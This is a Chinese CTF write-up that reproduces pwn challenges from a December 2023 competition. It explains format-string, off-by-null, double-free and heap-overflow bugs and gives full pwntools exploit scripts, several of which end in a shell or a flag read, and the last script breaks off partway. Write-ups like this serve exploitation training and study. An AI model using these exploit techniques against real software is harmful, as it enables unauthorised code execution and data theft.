# 2023 12月比赛wp复现


&lt;!--more--&gt;

## 强网杯

### ez_fmt

#### 解法一

程序开头给了stack 地址，利用格式化字符串漏洞修改返回地址，爆破one_gadget ，概率为1/4096。

```python
from pwn import*
context.arch=&#39;amd64&#39;
#context.log_level=&#39;debug&#39;

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def mydbg():
    gdb.attach(p,&#34;b *0x401239&#34;)
    pause()
i=1
while True:
    p=remote(&#39;47.104.24.40&#39;,1337)
    #p=process(&#34;./ez_fmt&#34;)
    ru(&#34;There is a gift for you &#34;)
    stack_addr=int(ru(&#34;\n&#34;),16)
    lg(&#34;stack_addr&#34;)
    lg(&#34;i&#34;)
    i=i&#43;1
    w_addr=0x0404010 
    ret_addr=stack_addr&#43;0x68
    main_addr=0x401196
    lg(&#34;ret_addr&#34;)
    payload=&#34;%19$p&#34;
    payload&#43;=&#34;%&#34;&#43;str(0x40-14)&#43;&#34;c&#34;&#43;&#34;%10$hhn&#34;&#43;&#34;%&#34;&#43;str(0xfb01-0x40)&#43;&#34;c&#34;&#43;&#34;%11$hn&#34;
    payload=payload.ljust(0x20,&#39;a&#39;)
    payload=payload.encode()&#43;p64(ret_addr&#43;2)&#43;p64(ret_addr)
    #mydbg()
    s(payload)
    # pause()
    libc_base=int(rn(14),16)-0x24083
    
    lg(&#34;libc_base&#34;)
    one_gaget=libc_base&#43;0xe3b01
    lg(&#34;one_gaget&#34;)
    myogg=(libc_base&amp;0xffffffffff000000)&#43;0x40fb01
    lg(&#34;myogg&#34;)
    if myogg==one_gaget:
        pause()
        print(&#34;success&#34;)
    else:
        p.close()
        continue
    p.interactive()

```

![image-20231216113044144](assets/202401150126736.png)

![image-20231216113047514](assets/202401150126737.png)

#### 解法二

利用格式化字符串漏洞篡改printf 函数的返回地址为start，同时泄露libc，这样就不会修改w为0，然后第二次格式化字符串漏洞修改返回地址为one gadget。

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;chals.sekai.team&#34;,4001)

#libc=ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def mydbg():
    gdb.attach(p,&#34;b *0x401239&#34;)
    pause()

p=process(&#34;./ez_fmt&#34;)
ru(&#34;There is a gift for you &#34;)
stack_addr=int(ru(&#34;\n&#34;),16)
lg(&#34;stack_addr&#34;)
w_addr=0x0404010 
ret_addr=stack_addr-0x8
start_addr=0x4010B0
lg(&#34;ret_addr&#34;)
payload=&#34;%19$p&#34;&#43;&#34;%&#34;&#43;str((start_addr&amp;0xfffff)-14)&#43;&#34;c&#34;&#43;&#34;%9$hn&#34;
payload=payload.encode().ljust(0x18,b&#34;a&#34;)&#43;p64(ret_addr)

sl(payload)
libc_base=int(rn(14),16)-0x24083
lg(&#34;libc_base&#34;)
one_gadgt=0xe3b01&#43;libc_base

ru(&#34;There is a gift for you &#34;)

ret1_addr=stack_addr-0xe8
lg(&#34;one_gadgt&#34;)
payload=&#34;%&#34;&#43;str(one_gadgt&amp;0xff)&#43;&#34;c&#34;&#43;&#34;%10$hhn&#34;&#43;&#34;%&#34;&#43;str(((one_gadgt&gt;&gt;8)&amp;0xffff)-(one_gadgt&amp;0xff))&#43;&#34;c%11$hn&#34;
payload=payload.encode().ljust(0x20,b&#34;a&#34;)&#43;p64(ret1_addr)&#43;p64(ret1_addr&#43;1)
s(payload)
p.interactive()

```







### warmup23

glibc 2.35 下的off by null，和glibc 2.31下的off by null 利用手法相同。

参考链接：http://tttang.com/archive/1614/#toc__6

构造出堆块重叠后进行largebin attack，修改stderr为fake file。然后利用off by null 修改top chunk size，申请一个大的chunk，触发malloc_assert ，利用house of apple  执行orw。

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
p=remote(&#34;120.24.69.11&#34;,12700)
#p=process(&#39;./warmup&#39;)
libc=ELF(&#39;./libc.so.6&#39;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
    gdb.attach(p,&#34;dir ~/glibc/glibc-2.35/&#34;)
    pause()


def menu(choice):
    ru(&#34;&gt;&gt; &#34;)
    sl(str(choice))


def add(size,content):
    menu(1)
    ru(&#34;Size:&#34;)
    sl(str(size))
    ru(&#34;Note:&#34;)
    s(content)

def show(index):
    menu(2)
    ru(&#34;Index:&#34;)
    sl(str(index))
    ru(&#34;Note:&#34;)

def delete(index):
    menu(3)
    ru(&#34;Index:&#34;)
    sl(str(index))

add(0x418, &#34;A&#34;*0x100) #0 A = P-&gt;fd
add(0xe8,&#34;barrier&#34;) #1 barrier
add(0x438, &#34;B0&#34;*0x100) #2 B0 helper
add(0x448, &#34;C0&#34;*0x100) #3 C0 = P , P&amp;0xff = 0
add(0x108,&#39;4&#39;*0x100) #4 barrier
add(0x488, &#34;H&#34;*0x100) # H0. helper for write bk-&gt;fd. vitcim chunk.
add(0x428, &#34;D&#34;*0x100) # 6 D = P-&gt;bk
add(0x108,&#34;barrier&#34;) # 7 barrier

delete(0) #A
delete(3) #c0
delete(6) #d
#unsortedbin: D-C0-A   C0-&gt;FD=A

delete(2) # merge B0 with C0. preserve p-&gt;fd p-&gt;bk
add(0x458, b&#39;a&#39; * 0x438 &#43; p64(0x561)[:-2])  #index 0 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551

add(0x428,&#39;A&#39;)  #2 C1 from ub
add(0x428,&#39;A&#39;)  #3 bk  D  from largebin
add(0x418,&#34;0&#34;*0x100)  #6 fd    A from largein

delete(6) #A
delete(2) #c1

# unsortedbin: C1-A ,   A-&gt;BK = C1
add(0x418, &#39;a&#39; * 8)  # 2 partial overwrite bk    A-&gt;bk = p
add(0x418,&#34;A&#34;)       #6  c1


# step4 use ub to set bk-&gt;fd
delete(6) # C1
delete(3) # D=P-&gt;bk
# ub-D-C1    D-&gt;FD = C1
delete(5) # merge D with H, preserve D-&gt;fd 

add(0x500-8, b&#39;6&#39;*0x488 &#43; p64(0x431)) #3 H1. bk-&gt;fd = p, partial write \x00

add(0x3b0,&#34;A&#34;) #5 recovery

delete(4)
add(0x108, 0x100*b&#39;4&#39; &#43; p64(0x560)) #4
delete(3)

add(0x448,&#34;A&#34;) #3 put libc to chunk 4
show(4)
libc_base=uu64()-0x219ce0
lg(&#34;libc_base&#34;)
show(2)
ru(&#34;a&#34;*8)
heap_base=u64(rn(6).ljust(8,b&#34;\x00&#34;))-0x15f0
lg(&#34;heap_base&#34;)

delete(3)
io_stderr=libc_base&#43;0x21a860
lg(&#34;io_stderr&#34;)
add(0x448,p64(libc_base&#43;0x219ce0)*2&#43;p64(0)&#43;p64(0x431)&#43;p64(libc_base&#43;0x21a0d0)*2&#43;p64(heap_base&#43;0xc20)&#43;p64(io_stderr-0x20)) #3


add(0x608,&#34;a&#34;) #6

read=libc_base&#43;libc.sym[&#39;read&#39;]
_IO_wfile_jumps=libc_base&#43;libc.sym[&#39;_IO_wfile_jumps&#39;]
magic_gadget=libc_base&#43;0x169e7a
syscall_ret=read&#43;0x10
pop_rax=libc_base&#43;0x0000000000045eb0
pop_rdi=libc_base&#43;0x000000000002a3e5
pop_rsi=libc_base&#43;0x000000000002be51
pop_rdx=libc_base&#43;0x00000000000796a2
ret=libc_base&#43;0x0000000000029cd6
leave_ret=0x000000000004da83&#43;libc_base
pop_r12_r15=0x000000000002be4c&#43;libc_base
close=libc_base&#43;libc.sym[&#39;close&#39;]
read=libc_base&#43;libc.sym[&#39;read&#39;]
write=libc_base&#43;libc.sym[&#39;write&#39;]

fake_file_addr=heap_base&#43;0xc30
wide_data_addr=fake_file_addr&#43;0xd0
wide_vtable_addr=wide_data_addr&#43;0xe8
rop_addr=wide_vtable_addr&#43;0x70
flag_addr=rop_addr
fake_file=p64(0)*3&#43;p64(1)
fake_file=fake_file.ljust(0x38,b&#34;\x00&#34;)&#43;p64(rop_addr)
fake_file=fake_file.ljust(0x90,b&#34;\x00&#34;)&#43;p64(wide_data_addr)
fake_file=fake_file.ljust(0xc8,b&#34;\x00&#34;)&#43;p64(_IO_wfile_jumps)
wide_data=b&#34;\x00&#34;.ljust(0xe0,b&#34;\x00&#34;)&#43;p64(wide_vtable_addr)
wide_vtable=b&#34;\x00&#34;.ljust(0x68,b&#34;\x00&#34;)&#43;p64(magic_gadget)
orw=b&#34;flag\x00\x00\x00\x00&#34;&#43;p64(pop_r12_r15)&#43;p64(0)&#43;p64(rop_addr-0x8)&#43;p64(leave_ret)&#43;p64(pop_rdi)&#43;p64(flag_addr)&#43;p64(pop_rsi)&#43;p64(0)&#43;p64(pop_rax)&#43;p64(2)&#43;p64(syscall_ret)
orw&#43;=p64(pop_rdi)&#43;p64(3)&#43;p64(pop_rsi)&#43;p64(rop_addr&#43;0x300)&#43;p64(pop_rdx)&#43;p64(0x50)&#43;p64(read)&#43;p64(pop_rdi)&#43;p64(1)&#43;p64(write)


delete(2)
add(0x600,&#34;A&#34;) #2
payload=fake_file&#43;wide_data&#43;wide_vtable&#43;orw
add(0x418,&#34;A&#34;) #8
delete(3)
add(0x448,p64(0)*2&#43;p64(~(2 | 0x8 | 0x800)&#43;(1&lt;&lt;64))&#43;p64(0)&#43;payload) #3
add(0xeec0,&#34;A&#34;)#9
add(0xeec0,&#34;A&#34;)#10
add(0x1000-0x480,&#34;A&#34;)#11
add(0x438,&#34;A&#34;) #12
delete(12)
add(0x438,&#34;A&#34;*0x438)

menu(1)
ru(&#34;Size:&#34;)
sl(str(0x500))


p.interactive()
```

![image-20231216233836916](assets/202401150126738.png)



### chatting

#### 解法一

首先填满0x100的tcache，然后释放当前usrname，使当前用户的message chunk（大小也为0x100） 进入unsorted bin，然后执行read 函数进行泄露libc。

泄露完之后，发现add message 时，如果add message 0x64次后（或者用户名长度大于 0x64），如果再次add会释放当前的message chunk，而如果delete 当前用户就会触发tcahche double free 检测，那么可得知程序中存在double free。

接下来通过构造chunk 结构，利用house of botcake 制造出重叠chunk，然后利用tcache 申请到free_hook 修改其为system，最后释放一个content为&#34;/bin/sh\x00&#34;的chunk 即可getshell

![image-20231217171306456](assets/202401150126739.png)

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;101.200.122.251&#34;,14509)
p=process(&#39;./chatting&#39;)
libc=ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)
#libc=ELF(&#39;./libc-2.27.so&#39;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *$rebase(0x000321F)\n decompiler connect ida --host 10.193.253.113 --port 3662&#34;)
	pause()


def menu(choice):
	ru(&#34;Choose action (add, delete, switch, message, read, listuser, exit): &#34;)
	sl(choice)


def add(usrname):
	menu(&#34;add&#34;)
	ru(&#34;Enter new username:&#34;)
	sl(usrname)

def delete(usrname):
	menu(&#34;delete&#34;)
	ru(&#34;Enter username to delete:&#34;)
	sl(usrname)

def switch_func(usrname):
	menu(&#34;switch&#34;)
	ru(&#34;Enter username to switch to: &#34;)
	sl(usrname)

def message_func(usrname,size,content):
	menu(&#34;message&#34;)
	ru(&#34;To: &#34;)
	sl(usrname)
	ru(&#34;Message size:&#34;)
	sl(str(size))
	ru(&#34;Content:&#34;)
	sl(content)

def read_func():
	menu(&#34;read&#34;)

def list_func():
	menu(&#34;listuser&#34;)



ru(&#34;Enter new username:&#34;)
sl(&#34;chuwei1&#34;)


message_func(&#34;chuwei1&#34;,0x100,&#34;a&#34;)

add(&#34;chuwei2&#34;)
for i in range(7):
	message_func(&#34;chuwei2&#34;,0x100,&#34;a&#34;)


delete(&#34;chuwei2&#34;)
add(&#34;chuwei2&#34;)

delete(&#34;chuwei1&#34;)

read_func()

libc_base=uu64()-96-0x10-libc.sym[&#39;__malloc_hook&#39;]
#libc_base=uu64()-0x219ce0
lg(&#34;libc_base&#34;)

add(&#34;chuwei1&#34;)
for i in range(0x64):
	message_func(&#34;chuwei2&#34;,0x30,&#34;aaaaaaaaaaaa&#34;)

for i in range(9):
	message_func(&#34;chuwei1&#34;,0x200,&#34;aaaaaaaaaaaa&#34;)
add(&#34;chuwei3&#34;)
delete(&#34;chuwei1&#34;)
add(&#34;chuwei1&#34;)

for i in range(7):
	message_func(&#34;chuwei1&#34;,0x200,&#34;aaaaaaaaaaaa&#34;)

message_func(&#34;chuwei3&#34;,0x200,&#34;aaaaaaaaaaaa&#34;) #prev

message_func(&#34;chuwei2&#34;,0x200,&#34;a&#34;*0x100)

add(&#34;chuwei4&#34;)

message_func(&#34;chuwei4&#34;,0x200,&#34;a&#34;*0x100)   #vitim



delete(&#34;chuwei1&#34;)
add(&#34;chuwei1&#34;)

delete(&#34;chuwei4&#34;)
add(&#34;chuwei4&#34;)

delete(&#34;chuwei3&#34;)
add(&#34;chuwei3&#34;)

message_func(&#34;chuwei3&#34;,0x200,&#34;aaaaaaaaaaaa&#34;)

delete(&#34;chuwei2&#34;)
add(&#34;chuwei2&#34;)
mydbg()
message_func(&#34;chuwei2&#34;,0x410,b&#34;\x00&#34;*0x200&#43;p64(0x210)&#43;p64(0x211)&#43;p64(libc_base&#43;libc.sym[&#39;__free_hook&#39;]))

message_func(&#34;chuwei2&#34;,0x200,&#34;/bin/sh\x00&#34;)
message_func(&#34;chuwei2&#34;,0x200,p64(libc_base&#43;libc.sym[&#39;system&#39;]))
delete(&#34;chuwei2&#34;)
p.interactive()
```

![image-20231217110436821](assets/202401150126740.png)

#### 解法二

向一个删除过的用户发送消息时候，多次申请message chunk 会导致释放其中的message chunk，然后再次add 该用户，会导致一个double free。可以利用这点构造出一个重叠堆块，具体构造脚本如下：

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
p=process(&#39;./chatting&#39;)
libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *$rebase(0x000321F)&#34;)#\n decompiler connect ida --host 10.193.253.113 --port 3662&#34;)
	pause()


def menu(choice):
	ru(&#34;Choose action (add, delete, switch, message, read, listuser, exit): &#34;)
	sl(choice)


def add(usrname):
	menu(&#34;add&#34;)
	ru(&#34;Enter new username:&#34;)
	sl(usrname)

def delete(usrname):
	menu(&#34;delete&#34;)
	ru(&#34;Enter username to delete:&#34;)
	sl(usrname)

def switch_func(usrname):
	menu(&#34;switch&#34;)
	ru(&#34;Enter username to switch to: &#34;)
	sl(usrname)

def message_func(usrname,size,content):
	menu(&#34;message&#34;)
	ru(&#34;To: &#34;)
	sl(usrname)
	ru(&#34;Message size:&#34;)
	sl(str(len(content)))
	ru(&#34;Content:&#34;)
	sl(content)

def read_func():
	menu(&#34;read&#34;)

def list_func():
	menu(&#34;listuser&#34;)


ru(&#34;Enter new username:&#34;)
sl(&#34;chuwwei1&#34;)
add(&#34;cc&#34;)
add(&#34;bb&#34;)
add(&#39;aa&#39;)
for i in range(3):
	message_func(&#39;bb&#39;, 0x78, b&#39;a&#39; * 0x78)

delete(&#34;bb&#34;)
add(&#34;bb&#34;)

delete(&#34;aa&#34;)

message_func(&#39;aa&#39;, 0x78, b&#39;a&#39; * 0x78)
message_func(&#39;aa&#39;, 0x78, b&#39;a&#39; * 0x78)
message_func(&#39;aa&#39;, 0x78, b&#39;a&#39; * 0x78)

message_func(&#39;bb&#39;,0x78,b&#34;a&#34;*0x78) #double free
for i in range(7):
	message_func(&#34;cc&#34;,0x78,b&#34;c&#34;*0x78)
delete(&#34;cc&#34;)
add(&#34;cc&#34;)
add(&#34;aa&#34;)
message_func(&#39;aa&#39;, 0x78, b&#39;a&#39; * 0x78)
delete(&#34;bb&#34;)


p.interactive()

```



### simpleinterpreter

程序实现一个c语言编译器，可以解析以下函数和类型。

![image-20231217171750751](assets/202401150126741.png)

那么我们利用malloc 和free 将一个chunk 释放到unsorted bin 中， 利用printf 打印出libc地址，然后tcache 的fd中写入free_hook，申请到free_hook 修改其为system，最后释放一个content为&#34;/bin/sh\x00&#34;的chunk 即可getshell。

```python
from pwn import*
p=remote(&#34;101.200.122.251&#34;,13410)
#p=process(&#39;./simpleinterpreter&#39;)
libc=ELF(&#39;./libc-2.27.so&#39;)
context.log_level=&#39;debug&#39;
context.arch=&#39;amd64&#39;
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xf7&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;decompiler connect ida --host 192.168.2.193 --port 3662\nb *$rebase(0x0CCB)&#34;)
	pause()
#0x1c48
payload=&#34;&#34;&#34;
int main(){
void *p1;
void *p2;
void *p3;
void *p4;
void *p5;
void *p6;
void *p7;
void *p8;
void *p9;
void *p10;
void *p11;
p1=malloc(0x100);
p2=malloc(0x100);
p3=malloc(0x100);
p4=malloc(0x100);
p5=malloc(0x100);
p6=malloc(0x100);
p7=malloc(0x100);
p8=malloc(0x100);
p9=malloc(0x100);
free(p1);
free(p2);
free(p3);
free(p4);
free(p5);
free(p6);
free(p7);
free(p8);
printf(&#34;%s&#34;,p8);
read(0,p7,0x8);
p10=malloc(0x100);
read(0,p10,0x8);
p11=malloc(0x100);
read(0,p11,0x8);
free(p10);
}&#34;&#34;&#34;
ru(&#34;Code size: &#34;)

sl(str(int(len(payload))))

ru(&#34;Please give me the code to interpret:&#34;)
s(payload)

libc_base=uu64()-0x3ebca0
lg(&#34;libc_base&#34;)
pause()
s(p64(libc_base&#43;libc.sym[&#39;__free_hook&#39;]))
pause()
s(&#34;/bin/sh\x00&#34;)
pause()
s(p64(libc_base&#43;libc.sym[&#39;system&#39;]))
p.interactive()
```

![image-20231217163443564](assets/202401150126743.png)

### WTOA

参考链接：https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#11-chatting

![Untitled](assets/202401150126744.png)

![Untitled](assets/202401150126745.png)

![Untitled](assets/202401150126746.png)

从ida 中的function call 中猜测main函数为function[17]

ida 导出function cal

先导出为test.gdl

![Untitled](assets/202401150126747.jpeg)

ubuntu 执行

`sudo apt-get install cflow graphviz` 

`sudo apt install libgraph-easy-perl`

`graph-easy --input=test.gdl --as_dot -o test.dot`

先运行程序发现是一个经典的菜单题目，因此主要逻辑函数里面肯定存在5个功能 和while 循环

最终发现function_17_ 是符合要求的，因此我们可以在function_17 下断点验证我们的猜想

![Untitled](assets/202401150126748.png)

我们会发现，我们执行function 16会打印菜单字符串

![Untitled](assets/202401150126749.png)

![Untitled](assets/202401150126750.png)

注意到function51 的第三个参数为0x477，而菜单字符串的地址为0x1b477，0x1b000正好是.rodata.wasm 段的起始地址，因此推断字符串的寻址应该为段基址&#43;偏移

![Untitled](assets/202401150126751.png)

那么我们很容易得到各个函数的位置。

接下来我们创建一些chunk ，观察结构。

![Untitled](assets/202401150126752.png)

发现note 结构体的一些内容如图所示，推测0x501cc0是note content的偏移，因为note content也是0xcc0 结尾的，而0x8 就是note 的size，还有一些特殊的值比如next 和prev  的note_struct 偏移，剩下的应该是一些特殊标志变量。

![Untitled](assets/202401150126753.png)

![Untitled](assets/202401150126754.png)

接着分析主函数

当我下断点在function 56 时，会发现要求我们输入

![Untitled](assets/202401150126755.png)

注意到rdx为0，rcx为0x501b20，r8为0x2，

因此推测改函数实现了read 的功能`read(0,offset,0x2)` ，而真正的地址应该为段基址&#43;offset

![Untitled](assets/202401150126756.png)

输入之前该地址的内容为空

![Untitled](assets/202401150126757.png)

输入之后`S\n` 之后正好为`&#39;\x0a\x53&#39;`

![Untitled](assets/202401150126758.png)

接下来根据读入的字符串 `-&#39;A&#39;` ，switch case进行选择功能

![Untitled](assets/202401150126759.png)

接下来还可以利用patch 讲function51的第三个参数加上0x1b000，方便我们观看，

还可以推出function 24 类似于atoi函数

![Untitled](assets/202401150126760.png)

function 9里面调用了function 56read函数，进行逐个字节读入。

![Untitled](assets/202401150126761.png)

![Untitled](assets/202401150126762.png)

在edit函数中存在一个明显的漏洞函数，当输入的length为0x345231时，我们可以读入0x30 字节。

![Untitled](assets/202401150126763.png)

程序开始时会读入flag ，位于我们创建的note struct 上方，因此，我们可以利用edit 的溢出，更改下一个chunk 的content 偏移，让它指向flag的位置，从而打印出flag。

![Untitled](assets/202401150126764.png)

```python
from pwn import*
context.log_level=&#39;debug&#39;
context.arch=&#39;amd64&#39;
#p=process(&#34;./launch.sh&#34;)
p=process([&#39;./wasmtime&#39;,&#39;run&#39;,&#39;--env&#39;, &#34;FLAG=flag{you_cat_the_flag}&#34;,&#39;--disable-cache&#39;,&#39;--allow-precompiled&#39;,&#39;./wtoa&#39;])

def mydbg():
	gdb.attach(p)
	pause()

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def menu(choice):
	ru(&#34;Choice &gt; &#34;)
	sl(choice)

def add(size,content):
	menu(&#34;A&#34;)
	ru(&#34;size &gt; &#34;)
	sl(str(size))
	ru(&#34;&gt; &#34;)
	s(content)
def edit(index,offset,length,content):
	menu(&#34;E&#34;)
	ru(&#34;index &gt;&#34;)
	sl(str(index))
	ru(&#34;offset &gt;&#34;)
	sl(str(offset))
	ru(&#34;length &gt; &#34;)
	sl(str(length))
	ru(&#34;&gt; &#34;)
	s(content)

def delete(index):
	menu(&#34;D&#34;)
	ru(&#34;index &gt;&#34;)
	sl(str(index))
def show(index,offset,length):
	menu(&#34;S&#34;)
	ru(&#34;index &gt;&#34;)
	sl(str(index))
	ru(&#34;offset &gt;&#34;)
	sl(str(offset))
	ru(&#34;length &gt; &#34;)
	sl(str(length))

add(0x8,&#34;chuwei11&#34;)
add(0x8,&#34;chuwei22&#34;)
#mydbg()
offset=0x0000000000501c68
payload=b&#39;a&#39;*8&#43;p64(0x0000001300000000)&#43;p64(0x00501ce000501ca8)&#43;p64(0x0000001b00000000)&#43;p64(offset)&#43;p64(0x200)
edit(0,0,0x345231,payload)
show(1,0,0x50)
p.interactive()
```

#### 后记

查看backtrace，发现 #11和#13 是wtoa 中的代码，在#13下断点

![Untitled](assets/202401150126765.png)

当执行到这里时，会发现程序进入了add函数的逻辑，且程序存在异步，所以我们在下一条汇编指令下断点

![Untitled](assets/202401150126766.png)

发现其确实执行了add函数的逻辑，因此猜测0x7ff7d8b9b464所在函数就是主要逻辑

![Untitled](assets/202401150126767.png)

算出偏移，在ida 里面查看在function 17函数中

![Untitled](assets/202401150126768.png)

![Untitled](assets/202401150126769.png)

那么经过调试也可以发现function 17为主要逻辑函数。

### trie

参考链接：https://blog.xmcve.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-Writeup/#title-13

https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#26-trie

简单说一下本地的逻辑，实现了一个简单的路由表：

- add 功能输入两个ip，每次遇到新ip会插入分支，并且其节点值赋值为tot，然后根据trie中的值，将ip2存放在对应下标的end数组中
- show 功能，查找ip 对应的下一跳ip值
- get flag ，将flag 存储在secret 处



本题漏洞点在于对search 找到的end 下标没做限制，且会将flag 读入到secret处，当v3为0x40 时，就会泄露secret 处的值（每次泄露四字节），也就是flag。

![image-20240115002736091](assets/202401150126770.png)

![image-20240115002811398](assets/202401150126771.png)

注意到每次insert 时并没有对tot 初始化，那么就给了我们机会让v3的值大于0x40

![image-20240115003033484](assets/202401150126772.png)

首先新增两个ip &#34;0.0.0.0&#34; &#34;255.255.255.255&#34;，这样会使tot 的值达到0x40

当ip 的bit为0时，对应的trie 下标为偶数，当ip 的bit 为1时，对应的trie 下班为奇数。

insert 函数首先从下标0开始寻找，如果trie对应的下标处值为0，那么就赋值为 tot，如果有值，那么将该下标赋值给v4，根据v4*2&#43;ip_bit作为下标得到trie[index] 的值，进行判断。

第一次add &#34;0.0.0.0&#34;时，trie[0],trie[2],trie[4]...,trie[62] 被赋值为&#43;&#43;tot，

第二次add &#34;255.255.255.255&#34;时，会先判断trie[1]，由于其值为0，那么trie[1] 就会赋值为0x21，然后接着判断trie[67]，trie[69],......,trie[127]

此时tot 的值为0x40(也就是trie[127]的值为0x40），那么我们show(&#34;255.255.255.255&#34;)，就会找到trie[127]处的值0x40，打印end[0x40] 处的值，即flag 的前四字节。

![image-20240115004343814](assets/202401150126773.png)

那么我们如果让show找到trie[index] 处的值为0x41，0x42，0x43，......呢？我们只需add 一个ip，其ip值和（&#34;0.0.0.0&#34;或 &#34;255.255.255.255&#34; 其中之一）有1，2，3，...... 位的偏差即可

如果add 128.0.0.0 那么就能打印end[0x41]处的值，add 192.0.0.0 那么就能打印end[0x42] 处的值

如果add 127.255.255.255 那么就能打印end[0x41]处的值，add 63.255.255.255，那么就能打印end[0x42] 处的值

```python
from pwn import*
context.arch=&#39;amd64&#39;
#context.log_level=&#39;debug&#39;
p=process(&#39;./trie&#39;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
